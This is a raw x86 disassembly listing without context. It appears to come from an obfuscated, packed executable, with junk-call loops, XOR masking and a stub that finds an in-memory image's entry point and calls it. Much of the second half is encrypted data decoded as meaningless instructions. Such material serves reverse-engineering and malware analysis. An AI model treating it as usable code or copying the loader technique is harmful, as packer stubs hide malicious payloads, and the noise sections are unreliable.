  409630:	mov    ebx,DWORD PTR [ebp-0x8]
  409633:	and    DWORD PTR ds:0x42e7c8,0x0
  40963d:	mov    ecx,DWORD PTR ds:0x42e7c8
  409643:	inc    ecx
  409644:	mov    DWORD PTR ds:0x42e7c8,ecx
  40964a:	cmp    DWORD PTR ds:0x42e7c8,0x16
  409651:	jne    0x409672
  409657:	push   DWORD PTR [ebp-0xc]
  40965a:	push   DWORD PTR [ebp-0x14]
  40965d:	push   0x8989
  409662:	push   0x2c01
  409667:	push   0x2fc9
  40966c:	call   DWORD PTR ds:0x42ec2f
  409672:	cmp    DWORD PTR ds:0x42e7c8,0x14
  409679:	jb     0x40963d
  40967f:	mov    ecx,DWORD PTR [ebp-0x4]
  409682:	mov    edx,DWORD PTR [ebp-0x4]
  409685:	xor    edx,esi
  409687:	xor    ecx,esi
  409689:	add    ecx,edx
  40968b:	mov    edx,DWORD PTR [ebp-0x4]
  40968e:	xor    ebx,esi
  409690:	xor    edx,esi
  409692:	add    ebx,edi
  409694:	lea    ecx,[ecx+edx*1+0x9757d1]
  40969b:	cmp    ebx,ecx
  40969d:	ja     0x4096fe
  4096a3:	mov    eax,DWORD PTR [ebp-0x4]
  4096a6:	xor    eax,esi
  4096a8:	lea    eax,[eax+ebx*1+0x32729b]
  4096af:	push   eax
  4096b0:	mov    eax,DWORD PTR [ebp-0xc]
  4096b3:	xor    eax,esi
  4096b5:	lea    eax,[ebp+eax*1+0x3272a3]
  4096bc:	push   eax
  4096bd:	mov    eax,ds:0x4121a8
  4096c2:	push   DWORD PTR [eax+0x1bc]
  4096c8:	call   0x4020d0
  4096cd:	mov    eax,DWORD PTR [ebp-0x4]
  4096d0:	xor    eax,esi
  4096d2:	lea    ebx,[ebx+eax*1+0x32729b]
  4096d9:	mov    eax,DWORD PTR [ebp-0x4]
  4096dc:	mov    ecx,DWORD PTR [ebp-0x4]
  4096df:	xor    ecx,esi
  4096e1:	xor    eax,esi
  4096e3:	add    eax,ecx
  4096e5:	mov    ecx,DWORD PTR [ebp-0x4]
  4096e8:	xor    ecx,esi
  4096ea:	lea    eax,[eax+ecx*1+0x9757d1]
  4096f1:	cmp    ebx,eax
  4096f3:	jbe    0x4096a3
  4096f9:	mov    eax,0xf89c853d
  4096fe:	mov    ecx,DWORD PTR [ebp+0xc]
  409701:	mov    DWORD PTR ds:0x41202c,ecx
  409707:	mov    ecx,DWORD PTR [ebp+0x10]
  40970a:	mov    DWORD PTR ds:0x412280,ecx
  409710:	mov    ecx,DWORD PTR ds:0x41202c
  409716:	mov    edx,DWORD PTR [ebp-0x14]
  409719:	sub    ecx,edi
  40971b:	xor    ecx,esi
  40971d:	mov    DWORD PTR [edx],ecx
  40971f:	mov    ecx,DWORD PTR [ebp-0x18]
  409722:	cmp    ecx,0xf89c8532
  409728:	je     0x409785
  40972e:	mov    ecx,DWORD PTR [ebp-0x8]
  409731:	mov    edx,DWORD PTR [ebp-0x1c]
  409734:	xor    ecx,esi
  409736:	add    ecx,edi
  409738:	cmp    ecx,edx
  40973a:	je     0x409785
  409740:	mov    eax,ds:0x4121a8
  409745:	mov    eax,DWORD PTR [eax+0x194]
  40974b:	mov    ecx,DWORD PTR [eax]
  40974d:	mov    eax,DWORD PTR [ecx+0x3c]
  409750:	push   DWORD PTR ds:0x412280
  409756:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  40975a:	push   DWORD PTR ds:0x41202c
  409760:	add    eax,ecx
  409762:	mov    ecx,DWORD PTR ds:0x4121a8
  409768:	mov    ecx,DWORD PTR [ecx+0x194]
  40976e:	push   DWORD PTR [ecx]
  409770:	call   eax
  409772:	mov    ecx,DWORD PTR ds:0x4121a8
  409778:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40977e:	mov    DWORD PTR [ecx],eax
  409780:	jmp    0x409895
  409785:	mov    ecx,DWORD PTR [ebp-0x8]
  409788:	mov    edx,DWORD PTR [ebp-0x20]
  40978b:	xor    ecx,esi
  40978d:	add    ecx,edi
  40978f:	cmp    ecx,edx
  409791:	jne    0x409878
  409797:	mov    ecx,DWORD PTR [ebp-0x8]
  40979a:	xor    ecx,esi
  40979c:	add    ecx,edi
  40979e:	mov    DWORD PTR ds:0x41222c,ecx
  4097a4:	mov    ecx,DWORD PTR [ebp-0x8]
  4097a7:	xor    ecx,esi
  4097a9:	add    ecx,edi
  4097ab:	mov    DWORD PTR ds:0x412224,ecx
  4097b1:	mov    ecx,DWORD PTR [ebp-0x4]
  4097b4:	mov    DWORD PTR [ebp-0xc],ecx
  4097b7:	mov    ecx,DWORD PTR [ebp-0x8]
  4097ba:	mov    DWORD PTR [ebp+0xc],ecx
  4097bd:	mov    ecx,DWORD PTR [ebp+0xc]
  4097c0:	xor    ecx,esi
  4097c2:	add    ecx,edi
  4097c4:	mov    DWORD PTR [ebp+0xc],ecx
  4097c7:	mov    ecx,DWORD PTR ds:0x412028
  4097cd:	mov    ecx,DWORD PTR [ecx]
  4097cf:	mov    DWORD PTR [ebp+0xc],ecx
  4097d2:	mov    ecx,DWORD PTR ds:0x412230
  4097d8:	mov    ecx,DWORD PTR [ecx]
  4097da:	mov    DWORD PTR [ebp-0x14],ecx
  4097dd:	mov    DWORD PTR [ebp+0x10],0xf89c8731
  4097e4:	mov    ecx,DWORD PTR [ebp+0x10]
  4097e7:	xor    ecx,esi
  4097e9:	add    ecx,edi
  4097eb:	mov    DWORD PTR [ebp+0x10],ecx
  4097ee:	mov    ecx,DWORD PTR ds:0x4121a8
  4097f4:	mov    DWORD PTR [ebp+0x10],ecx
  4097f7:	mov    ecx,DWORD PTR [ebp+0xc]
  4097fa:	mov    DWORD PTR [ebp+0xc],ecx
  4097fd:	mov    ecx,DWORD PTR [ebp+0xc]
  409800:	push   0x4
  409802:	pop    edx
  409803:	sub    edx,ecx
  409805:	add    edx,DWORD PTR [ebp-0x14]
  409808:	mov    DWORD PTR [ebp-0x24],0xf89c85f1
  40980f:	mov    DWORD PTR [ebp+0x10],edx
  409812:	mov    DWORD PTR [ebp-0x70],eax
  409815:	mov    eax,DWORD PTR [ebp+0xc]
  409818:	mov    DWORD PTR [ebp-0x6c],eax
  40981b:	mov    eax,DWORD PTR [ebp+0x10]
  40981e:	mov    DWORD PTR [ebp-0x68],eax
  409821:	mov    eax,DWORD PTR [ebp-0x24]
  409824:	xor    eax,esi
  409826:	add    eax,edi
  409828:	mov    DWORD PTR [ebp-0x64],eax
  40982b:	lea    eax,[ebp-0x2c]
  40982e:	mov    DWORD PTR [ebp-0x60],eax
  409831:	mov    eax,DWORD PTR [ebp-0x70]
  409834:	xor    eax,esi
  409836:	add    eax,edi
  409838:	mov    DWORD PTR [ebp-0x70],eax
  40983b:	lea    eax,[ebp-0x70]
  40983e:	push   eax
  40983f:	mov    eax,DWORD PTR [ebp-0xc]
  409842:	xor    eax,esi
  409844:	add    eax,edi
  409846:	push   eax
  409847:	mov    eax,ds:0x4121c8
  40984c:	push   0x41211e
  409851:	push   DWORD PTR [eax]
  409853:	call   0x40cdc5
  409858:	xor    esi,esi
  40985a:	mov    eax,DWORD PTR [ebp+0x10]
  40985d:	sub    eax,esi
  40985f:	push   eax
  409860:	mov    eax,DWORD PTR [ebp+0xc]
  409863:	add    eax,esi
  409865:	push   eax
  409866:	call   0x406a53
  40986b:	inc    esi
  40986c:	cmp    esi,0x52
  40986f:	jb     0x40985a
  409875:	mov    eax,DWORD PTR [ebp-0xc]
  409878:	call   0x4054ab
  40987d:	lea    eax,[ebp+0x4]
  409880:	mov    DWORD PTR [ebp-0x28],eax
  409883:	mov    eax,DWORD PTR [ebp-0x10]
  409886:	mov    eax,DWORD PTR [ebp-0x4]
  409889:	push   DWORD PTR [ebp-0x8]
  40988c:	lea    eax,[ebp-0x28]
  40988f:	push   eax
  409890:	call   0x40ccd9
  409895:	mov    eax,ds:0x4121a8
  40989a:	push   0x4
  40989c:	add    eax,0x1cc
  4098a1:	push   eax
  4098a2:	lea    eax,[ebp-0x10]
  4098a5:	push   eax
  4098a6:	call   0x4020d0
  4098ab:	mov    eax,DWORD PTR [ebp-0x10]
  4098ae:	mov    eax,DWORD PTR [eax]
  4098b0:	pop    edi
  4098b1:	pop    esi
  4098b2:	pop    ebx
  4098b3:	leave  
  4098b4:	ret    0xc
  4098b7:	push   ebp
  4098b8:	mov    ebp,esp
  4098ba:	sub    esp,0x24
  4098bd:	mov    eax,ds:0x4121a8
  4098c2:	xor    ecx,DWORD PTR ds:0x42e7c4
  4098c8:	mov    eax,DWORD PTR [eax+0x198]
  4098ce:	mov    DWORD PTR [ebp-0x8],eax
  4098d1:	mov    DWORD PTR ds:0x43045d,0x14
  4098db:	cmp    DWORD PTR ds:0x43045d,0x0
  4098e2:	je     0x40993f
  4098e8:	cmp    DWORD PTR ds:0x43045d,0x1b
  4098ef:	jne    0x40991f
  4098f5:	push   0x8cdb
  4098fa:	push   DWORD PTR [ebp-0x10]
  4098fd:	push   0x3afe
  409902:	push   0x5d4e
  409907:	push   DWORD PTR [ebp-0x10]
  40990a:	push   0x4817
  40990f:	push   0x7044
  409914:	push   0x34c1
  409919:	call   DWORD PTR ds:0x42ec33
  40991f:	mov    eax,ds:0x43045d
  409924:	dec    eax
  409925:	mov    ds:0x43045d,eax
  40992a:	jmp    0x4098db
  40992f:	mov    eax,ds:0x4304d7
  409934:	or     eax,DWORD PTR ds:0x4304df
  40993a:	mov    ds:0x4304d7,eax
  40993f:	mov    eax,DWORD PTR [ebp+0x8]
  409942:	mov    DWORD PTR ds:0x42e7d0,0x13
  40994c:	cmp    DWORD PTR ds:0x42e7d0,0x0
  409953:	je     0x40998b
  409959:	cmp    DWORD PTR ds:0x42e7d0,0x19
  409960:	jne    0x409979
  409966:	push   0x7ebc
  40996b:	push   0x1c7b
  409970:	push   DWORD PTR [ebp-0x10]
  409973:	call   DWORD PTR ds:0x42ec37
  409979:	mov    ecx,DWORD PTR ds:0x42e7d0
  40997f:	dec    ecx
  409980:	mov    DWORD PTR ds:0x42e7d0,ecx
  409986:	jmp    0x40994c
  40998b:	mov    ecx,DWORD PTR [ebp-0x8]
  40998e:	xor    DWORD PTR ds:0x430449,0x600e
  409998:	push   ebx
  409999:	push   esi
  40999a:	mov    esi,0x7510854
  40999f:	xor    eax,esi
  4099a1:	xor    DWORD PTR ds:0x430459,ebx
  4099a7:	push   edi
  4099a8:	and    DWORD PTR ds:0x4304cf,0x0
  4099b2:	mov    edi,DWORD PTR ds:0x4304cf
  4099b8:	inc    edi
  4099b9:	mov    DWORD PTR ds:0x4304cf,edi
  4099bf:	cmp    DWORD PTR ds:0x4304cf,0x8
  4099c6:	jne    0x4099e8
  4099cc:	push   0x43043d
  4099d1:	push   DWORD PTR [ebp-0x24]
  4099d4:	push   DWORD PTR [ebp-0x1c]
  4099d7:	push   DWORD PTR [ebp-0x28]
  4099da:	push   DWORD PTR [ebp-0x28]
  4099dd:	push   0x8706
  4099e2:	call   DWORD PTR ds:0x42eac7
  4099e8:	cmp    DWORD PTR ds:0x4304cf,0x7
  4099ef:	jne    0x409a02
  4099f5:	mov    edi,DWORD PTR ds:0x4304cf
  4099fb:	inc    edi
  4099fc:	mov    DWORD PTR ds:0x4304cf,edi
  409a02:	cmp    DWORD PTR ds:0x4304cf,0x16
  409a09:	jb     0x4099b2
  409a0f:	add    DWORD PTR ds:0x4304df,0x13b8
  409a19:	mov    edi,0x32729b
  409a1e:	and    DWORD PTR ds:0x430435,0x0
  409a28:	mov    ebx,DWORD PTR ds:0x430435
  409a2e:	inc    ebx
  409a2f:	mov    DWORD PTR ds:0x430435,ebx
  409a35:	cmp    DWORD PTR ds:0x430435,0xe
  409a3c:	jne    0x409a50
  409a42:	push   DWORD PTR [ebp-0x18]
  409a45:	push   0x6c31
  409a4a:	call   DWORD PTR ds:0x42ea03
  409a50:	cmp    DWORD PTR ds:0x430435,0xd
  409a57:	jne    0x409a6a
  409a5d:	mov    ebx,DWORD PTR ds:0x430435
  409a63:	inc    ebx
  409a64:	mov    DWORD PTR ds:0x430435,ebx
  409a6a:	cmp    DWORD PTR ds:0x430435,0x18
  409a71:	jb     0x409a28
  409a77:	mov    ebx,DWORD PTR ds:0x42e7c8
  409a7d:	or     DWORD PTR ds:0x42edcb,ebx
  409a83:	jmp    0x409dd0
  409a88:	pop    eax
  409a89:	push   edi
  409a8a:	lods   al,BYTE PTR ds:[esi]
  409a8b:	sahf   
  409a8c:	mov    cl,0x65
  409a8e:	push   0x8aa37451
  409a93:	push   ebx
  409a94:	dec    ecx
  409a95:	xor    cl,bl
  409a97:	mov    cl,0x59
  409a99:	fdivr  QWORD PTR [esi+0x7e]
  409a9c:	cs jge 0x409b1d
  409a9f:	jle    0x409a37
  409aa1:	push   ss
  409aa2:	scas   eax,DWORD PTR es:[edi]
  409aa3:	std    
  409aa4:	xor    cl,BYTE PTR [ebp-0x74]
  409aa7:	mov    dh,0x1b
  409aa9:	data16 jmp 0x409a82
  409aac:	dec    edi
  409aad:	fnsave [ebx]
  409aaf:	inc    ecx
  409ab0:	(bad)  
  409ab1:	ds push ss
  409ab3:	scas   al,BYTE PTR es:[edi]
  409ab4:	gs int3 
  409ab6:	fnstenv [eax-0x22]
  409ab9:	jno    0x409a7e
  409abb:	imul   ebp,esi,0xffffffa3
  409abe:	shr    ebx,1
  409ac0:	cmp    al,0x7b
  409ac2:	ret    
  409ac3:	jae    0x409abb
  409ac5:	fdiv   st(6),st
  409ac7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409ac8:	fwait
  409ac9:	xor    esp,ebx
  409acb:	das    
  409acc:	xchg   ecx,eax
  409acd:	mov    dh,0x34
  409acf:	mov    dh,0xbe
  409ad1:	cmp    BYTE PTR [edi+0x7],ah
  409ad4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409ad5:	push   ebx
  409ad6:	inc    ebx
  409ad7:	lahf   
  409ad8:	scas   eax,DWORD PTR es:[edi]
  409ad9:	out    dx,al
  409ada:	cs aam 0xee
  409add:	dec    ebx
  409ade:	mov    esp,0xcd5ed923
  409ae3:	ret    0x7643
  409ae6:	push   es
  409ae7:	ret    
  409ae8:	mov    dh,0xfd
  409aea:	cmc    
  409aeb:	int    0xf3
  409aed:	dec    ebp
  409aee:	ins    DWORD PTR es:[edi],dx
  409aef:	(bad)  
  409af0:	jl     0x409aa3
  409af2:	dec    edx
  409af3:	jp     0x409b06
  409af5:	test   al,0x45
  409af7:	add    al,0x28
  409af9:	retf   0x8789
  409afc:	dec    esp
  409afd:	add    BYTE PTR [ebx],0xa4
  409b00:	ror    DWORD PTR [eax-0x31e85e8],1
  409b06:	push   0xc93f79ad
  409b0b:	jae    0x409b1e
  409b0d:	aad    0xbb
  409b0f:	cs push ss
  409b11:	stc    
  409b12:	pop    eax
  409b14:	jne    0x409ad0
  409b16:	bound  edx,QWORD PTR ds:0x5eced07
  409b1c:	or     al,0xa4
  409b1e:	loop   0x409b22
  409b20:	int    0x3e
  409b22:	pop    eax
  409b23:	lods   al,BYTE PTR ds:[esi]
  409b24:	adc    al,0x61
  409b26:	sub    al,0x86
  409b28:	test   al,0x8f
  409b2a:	jb     0x409ba0
  409b2c:	lods   eax,DWORD PTR ds:[esi]
  409b2d:	or     BYTE PTR [edx+0x31],ah
  409b30:	push   ss
  409b31:	rcl    BYTE PTR [ecx+0x19800336],0x1c
  409b38:	or     al,0x76
  409b3a:	in     al,0x89
  409b3c:	dec    edx
  409b3d:	mov    al,BYTE PTR [eax+0x43926d2a]
  409b43:	loopne 0x409b7f
  409b45:	adc    DWORD PTR [ecx+0x6fadc3ee],edx
  409b4b:	(bad)  [edi+0x2c5e4c91]
  409b51:	push   esp
  409b52:	das    
  409b53:	(bad)  
  409b54:	jmp    0x6cea:0x7add948
  409b5b:	data16 sub BYTE PTR [ecx-0x4dc065ce],dh
  409b62:	out    dx,eax
  409b63:	rcr    BYTE PTR [edx],cl
  409b65:	cmp    ecx,eax
  409b67:	adc    ebx,DWORD PTR [eax]
  409b69:	setb   BYTE PTR [esi]
  409b6c:	in     al,dx
  409b6d:	sbb    ecx,DWORD PTR [ebx-0x5f]
  409b70:	rcr    BYTE PTR ds:0x798b3f37,cl
  409b76:	and    eax,0x2eb4e857
  409b7b:	cwde   
  409b7c:	and    al,0x1f
  409b7e:	pop    ecx
  409b7f:	retf   
  409b80:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409b81:	sub    BYTE PTR [eax+0x8],0x28
  409b85:	and    DWORD PTR [edx+0x6d5514b7],ecx
  409b8b:	mov    DWORD PTR [edi],esp
  409b8d:	and    dh,bl
  409b8f:	lock stos BYTE PTR es:[edi],al
  409b91:	mov    edx,0xe51ef681
  409b96:	xor    al,0xd5
  409b98:	fmul   QWORD PTR [edi+ebp*2]
  409b9b:	pop    edi
  409b9c:	push   ebp
  409b9d:	push   eax
  409b9e:	mov    ds:0xb1a814a9,eax
  409ba3:	pushf  
  409ba4:	mov    ds:0xa3e1c318,al
  409ba9:	sbb    BYTE PTR [ebx-0x22b18bc0],ch
  409baf:	stos   BYTE PTR es:[edi],al
  409bb0:	stc    
  409bb1:	adc    bl,BYTE PTR [esi+0x2524c780]
  409bb7:	pop    esp
  409bb8:	repz into 
  409bba:	repz shl DWORD PTR gs:[ebp+0x65],cl
  409bbf:	test   DWORD PTR [eax-0x3101b51b],ebx
  409bc5:	in     al,0x9d
  409bc7:	dec    ecx
  409bc8:	test   eax,0x6ef075ea
  409bcd:	test   BYTE PTR [esi-0x28],al
  409bd0:	sar    DWORD PTR [esi],0x19
  409bd3:	loopne 0x409b67
  409bd5:	fidiv  WORD PTR [ebx-0x2f]
  409bd8:	lods   eax,DWORD PTR ds:[esi]
  409bd9:	inc    ebp
  409bda:	or     al,0x41
  409bdc:	fdivrp st(2),st
  409bde:	sub    DWORD PTR [ecx+ebx*2-0x6d1f827e],esi
  409be5:	int3   
  409be6:	test   eax,0x71e956
  409beb:	xor    esi,DWORD PTR [ecx-0x1d400900]
  409bf1:	aad    0x7
  409bf3:	pop    eax
  409bf4:	jmp    0x409b81
  409bf6:	add    BYTE PTR [esi+0x5],0xcc
  409bfa:	sbb    edx,DWORD PTR [ebp+0x13]
  409bfd:	pop    esi
  409bfe:	out    0xe3,al
  409c00:	xor    eax,0x61b27aeb
  409c05:	mov    eax,0xed4a7fdc
  409c0a:	rcl    eax,0x50
  409c0d:	mov    ebx,0xda83e318
  409c12:	test   eax,0x19674702
  409c17:	mov    dh,0x23
  409c19:	or     esp,DWORD PTR [edx-0x7c]
  409c1c:	dec    edi
  409c1d:	in     eax,0x30
  409c1f:	(bad)  
  409c20:	pusha  
  409c21:	and    ch,BYTE PTR [eax]
  409c23:	push   es
  409c24:	stos   BYTE PTR es:[edi],al
  409c25:	mov    ?,WORD PTR [ebx+0x25]
  409c28:	loopne 0x409be7
  409c2a:	cdq    
  409c2b:	mov    al,ds:0xf67a6e74
  409c30:	iret   
  409c31:	nop
  409c32:	xor    DWORD PTR [ebx+edi*4-0x1b],0xfffffff5
  409c37:	fnstcw WORD PTR [eax+0x7c3c976f]
  409c3d:	pop    es
  409c3e:	shr    ecx,0xbb
  409c41:	stos   DWORD PTR es:[edi],eax
  409c42:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409c43:	cli    
  409c44:	sbb    eax,0x551689fc
  409c49:	xchg   edi,eax
  409c4a:	(bad)  
  409c4b:	bnd jbe 0x409c12
  409c4e:	aam    0x61
  409c50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409c51:	(bad)  
  409c52:	and    ecx,DWORD PTR ds:[edi+0x5a]
  409c56:	ucomiss xmm2,xmm5
  409c59:	repnz xor esi,ebx
  409c5c:	jle    0x409cc4
  409c5e:	dec    ecx
  409c5f:	cli    
  409c60:	mov    esi,0x5091c1be
  409c65:	jg     0x409c64
  409c67:	xchg   ebp,eax
  409c68:	cld    
  409c69:	rcr    DWORD PTR [esi],0x38
  409c6c:	or     ecx,0x2e75dc40
  409c72:	icebp  
  409c73:	pop    ecx
  409c74:	xchg   edx,eax
  409c75:	fs pop ecx
  409c77:	xlat   BYTE PTR ds:[ebx]
  409c78:	sub    al,0x7b
  409c7a:	out    dx,eax
  409c7b:	mov    ss,edi
  409c7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409c7e:	xchg   ebp,eax
  409c7f:	sub    DWORD PTR fs:[ecx+0x2cf40d40],esp
  409c86:	call   0xa67bb71d
  409c8b:	js     0x409c88
  409c8d:	sbb    edi,DWORD PTR [ebp+0x18b7c975]
  409c93:	(bad)  
  409c94:	cld    
  409c95:	aad    0x62
  409c97:	cwde   
  409c98:	fstp   QWORD PTR [eax+0x1832c81d]
  409c9e:	jl     0x409c36
  409ca0:	dec    eax
  409ca1:	retf   
  409ca2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409ca3:	dec    ebp
  409ca4:	add    ch,BYTE PTR [ecx+eax*8]
  409ca7:	sbb    eax,0x93933efc
  409cac:	add    DWORD PTR [ebp-0x6b],0x14
  409cb0:	loop   0x409cdf
  409cb2:	(bad)  
  409cb3:	fist   WORD PTR [ecx-0x2a]
  409cb6:	inc    edi
  409cb7:	pop    esi
  409cb8:	cwde   
  409cb9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409cba:	mov    eax,fs
  409cbc:	mov    ebx,0xf3684c8e
  409cc1:	aad    0x1
  409cc3:	pop    ebx
  409cc4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409cc5:	pop    ss
  409cc6:	adc    DWORD PTR [eax+0x4fa2c400],edx
  409ccc:	xor    ebp,DWORD PTR [ecx-0x44]
  409ccf:	enter  0xff9b,0xc6
  409cd3:	pop    ecx
  409cd4:	xor    al,0xfd
  409cd6:	inc    esp
  409cd7:	cmc    
  409cd8:	mov    ah,0x3f
  409cda:	xchg   esp,eax
  409cdb:	pop    ebp
  409cdc:	(bad)  
  409cdd:	or     al,BYTE PTR [ecx+edi*4+0x56]
  409ce1:	mov    esi,0x26040f67
  409ce6:	mov    ?,WORD PTR fs:[eax+eax*8+0xf9c7dbc]
  409cee:	cmp    DWORD PTR [ecx+0x3c477160],eax
  409cf4:	jecxz  0x409d67
  409cf6:	jno    0x409c90
  409cf8:	adc    BYTE PTR [ebx],0xd8
  409cfb:	sub    eax,0x87badae3
  409d00:	fmul   QWORD PTR [eax+0x38afec91]
  409d06:	fcmovne st,st(1)
  409d08:	cld    
  409d09:	iret   
  409d0a:	sub    eax,0xabdfc86b
  409d0f:	retf   0xc9f7
  409d12:	and    edx,ecx
  409d14:	cmc    
  409d15:	adc    eax,0x18728956
  409d1a:	pop    ebx
  409d1b:	add    al,0x36
  409d1d:	iret   
  409d1e:	pop    esi
  409d1f:	pop    edi
  409d20:	jnp    0x409cb4
  409d22:	mov    eax,ds:0x972d8e07
  409d27:	jge    0x409cd0
  409d29:	fs push es
  409d2b:	cmp    al,0xbe
  409d2d:	jmp    0xa011a444
  409d32:	out    0xf8,eax
  409d34:	jns    0x409d2d
  409d36:	and    BYTE PTR [eax-0x76883547],0xe1
  409d3d:	dec    edi
  409d3e:	hlt    
  409d3f:	push   edi
  409d40:	mov    esp,0xe92e83a9
  409d45:	xor    eax,0x74d1bfe9
  409d4a:	retf   
  409d4b:	mov    ds:0xa000e4e4,al
  409d50:	test   eax,0x30af233e
  409d55:	ins    BYTE PTR es:[edi],dx
  409d56:	shl    DWORD PTR [ecx-0x1e],1
  409d59:	fstp   DWORD PTR [ebp-0x14]
  409d5c:	xchg   esp,eax
  409d5d:	nop
  409d5e:	pop    ecx
  409d5f:	add    ch,BYTE PTR [ebx+0x69]
  409d62:	and    DWORD PTR [ebp+0xc246822],ebx
  409d68:	cmp    al,0xe9
  409d6a:	(bad)  
  409d6b:	jmp    0x409d74
  409d6d:	xchg   esi,eax
  409d6e:	ins    BYTE PTR es:[edi],dx
  409d6f:	push   esi
  409d70:	jmp    0x4ec6e505
  409d75:	iret   
  409d76:	rcr    BYTE PTR [ebp-0x25e97e81],1
  409d7c:	mov    ebp,0xec55515
  409d81:	stos   DWORD PTR es:[edi],eax
  409d82:	and    esi,DWORD PTR [esi]
  409d84:	rcr    BYTE PTR [ebx-0x41ee3247],cl
  409d8a:	std    
  409d8b:	sar    BYTE PTR [ebx],1
  409d8d:	sbb    DWORD PTR [edi-0x464ff488],esp
  409d93:	outs   dx,DWORD PTR ds:[esi]
  409d94:	mov    esp,0xa92aa2ec
  409d99:	mov    ebx,0x2d6d5371
  409d9e:	js     0x409d28
  409da0:	xlat   BYTE PTR ds:[ebx]
  409da1:	jb     0x409db0
  409da3:	sahf   
  409da4:	and    esp,DWORD PTR [ebx+esi*4]
  409da7:	mov    ebx,DWORD PTR [ecx+0x2ab326a6]
  409dad:	jecxz  0x409df9
  409daf:	inc    ecx
  409db0:	mov    ds:0xffc9f01f,al
  409db5:	mov    ch,0x60
  409db7:	or     bh,BYTE PTR [edi]
  409db9:	lods   al,BYTE PTR ds:[esi]
  409dba:	fisttp DWORD PTR [esi]
  409dbc:	dec    eax
  409dbd:	cwde   
  409dbe:	xchg   ebx,eax
  409dbf:	mov    ?,esi
  409dc1:	pop    eax
  409dc2:	push   ss
  409dc3:	sub    cl,BYTE PTR [ebx]
  409dc5:	stc    
  409dc6:	rcl    BYTE PTR [edi],cl
  409dc8:	mov    eax,0x53093bdf
  409dcd:	daa    
  409dce:	lahf   
  409dcf:	into   
  409dd0:	add    eax,edi
  409dd2:	mov    ebx,DWORD PTR ds:0x42e7d8
  409dd8:	add    ebx,DWORD PTR ds:0x4304d7
  409dde:	mov    DWORD PTR ds:0x42e7d8,ebx
  409de4:	mov    DWORD PTR [ecx],eax
  409de6:	add    DWORD PTR ds:0x43045d,0xe83
  409df0:	lea    eax,[ebp-0x4]
  409df3:	sub    DWORD PTR ds:0x4304cf,ecx
  409df9:	mov    DWORD PTR [ebp-0x10],eax
  409dfc:	movzx  ebx,WORD PTR ds:0x430451
  409e03:	and    DWORD PTR ds:0x430471,ebx
  409e09:	mov    eax,DWORD PTR [ebp+0x8]
  409e0c:	add    DWORD PTR ds:0x43044d,0x3f18
  409e16:	mov    ecx,DWORD PTR [ebp-0x10]
  409e19:	jmp    0x40a166
  409e1e:	scas   al,BYTE PTR es:[edi]
  409e1f:	mov    ebx,0x35712771
  409e24:	push   0x30b4a53
  409e29:	jb     0x409ded
  409e2b:	and    DWORD PTR [edi+ebx*1],0x9
  409e2f:	fdivr  DWORD PTR [esi+0x7e]
  409e32:	cs jge 0x409eb3
  409e35:	jle    0x409ea6
  409e37:	dec    ebx
  409e38:	push   ecx
  409e39:	addr16 adc dh,ch
  409e3c:	(bad)  
  409e3d:	(bad)  
  409e3e:	mov    edx,0x6157fb55
  409e43:	(bad)  
  409e45:	xchg   ebx,eax
  409e46:	pop    ss
  409e47:	push   ebp
  409e48:	or     al,0x2e
  409e4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409e4b:	mov    al,ds:0xb88662ec
  409e50:	retf   
  409e51:	mov    al,ah
  409e53:	scas   al,BYTE PTR es:[edi]
  409e54:	mov    dh,0xd3
  409e56:	mov    ebp,0xa59025c2
  409e5b:	scas   al,BYTE PTR es:[edi]
  409e5c:	sub    bh,bl
  409e5e:	test   al,0x21
  409e60:	es hlt 
  409e62:	cmp    eax,0x9cd8a7ec
  409e67:	popa   
  409e68:	mov    edi,0xc0ea2d67
  409e6d:	(bad)  
  409e6e:	out    dx,eax
  409e6f:	pop    ebp
  409e70:	sub    al,0x95
  409e72:	shld   DWORD PTR [edx+0x2b943695],edx,cl
  409e79:	in     al,dx
  409e7a:	fist   WORD PTR [edx-0x5e]
  409e7d:	sub    eax,0x246f473b
  409e82:	test   al,0xdf
  409e84:	fdiv   DWORD PTR [ebx+eiz*8]
  409e87:	retf   
  409e88:	inc    ebx
  409e89:	fdivp  st(3),st
  409e8b:	mov    ah,0x95
  409e8d:	bswap  ecx
  409e8f:	add    al,0xa3
  409e91:	xor    al,BYTE PTR [ebp-0x4e]
  409e94:	cmp    eax,0x7a913e55
  409e99:	mov    ds:0x1654c4e3,al
  409e9e:	jae    0x409f09
  409ea0:	mov    cr6,esp
  409ea3:	in     al,0x70
  409ea5:	std    
  409ea6:	inc    edi
  409ea7:	xchg   esp,eax
  409ea8:	xchg   edi,eax
  409ea9:	adc    ah,BYTE PTR [ebp-0x55]
  409eac:	outs   dx,BYTE PTR ds:[esi]
  409ead:	(bad)  
  409eae:	sar    ebx,1
  409eb0:	rcr    ah,0x65
  409eb3:	dec    esi
  409eb4:	jnp    0x409e5d
  409eb6:	ss inc esp
  409eb8:	add    bl,BYTE PTR [ebx*2+0x63efcd29]
  409ebf:	mov    ah,0xa5
  409ec1:	int3   
  409ec2:	add    al,BYTE PTR [edi+0x3b399756]
  409ec8:	mov    esp,0x41965160
  409ecd:	es in  al,dx
  409ecf:	add    al,0x4c
  409ed1:	daa    
  409ed2:	ins    DWORD PTR es:[edi],dx
  409ed3:	push   0x5ef7b178
  409ed8:	mov    cl,0x0
  409eda:	push   eax
  409edb:	and    ebx,DWORD PTR cs:[ebx-0x59]
  409edf:	add    bh,ah
  409ee1:	mov    ecx,0x585539e1
  409ee6:	fxch   st(1)
  409ee8:	cdq    
  409ee9:	add    DWORD PTR [edi-0x2d8357fb],esp
  409eef:	sbb    al,cl
  409ef1:	adc    BYTE PTR [ebp+0x607abc1f],bh
  409ef7:	ds xor edi,ebp
  409efa:	and    al,bh
  409efc:	dec    ebp
  409efd:	les    edi,FWORD PTR [eax-0x1bf13ca]
  409f03:	dec    ebx
  409f04:	push   ebp
  409f05:	adc    BYTE PTR [edx-0x2f],bl
